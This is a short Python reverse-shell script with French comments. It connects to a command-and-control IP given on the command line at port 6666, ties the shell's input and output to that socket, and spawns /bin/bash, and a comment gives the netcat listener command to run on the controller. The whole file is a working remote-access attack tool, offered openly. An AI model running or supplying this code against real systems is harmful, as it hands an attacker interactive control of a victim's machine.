import socket
import pty
import sys
import os

# run 'nc -l -vv -n -p 6666' on the CNC

CNC_IP = sys.argv[1] # Prend le premier fichier

# Se connecte au 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((CNC_IP,6666))

os.dup2(s.fileno(),0)#stdin = 0
os.dup2(s.fileno(),1)#stdout = 1
os.dup2(s.fileno(),2)#stderr = 2

s.send(b"Welcome !\n")# welcome message
pty.spawn("/bin/bash")
s.close()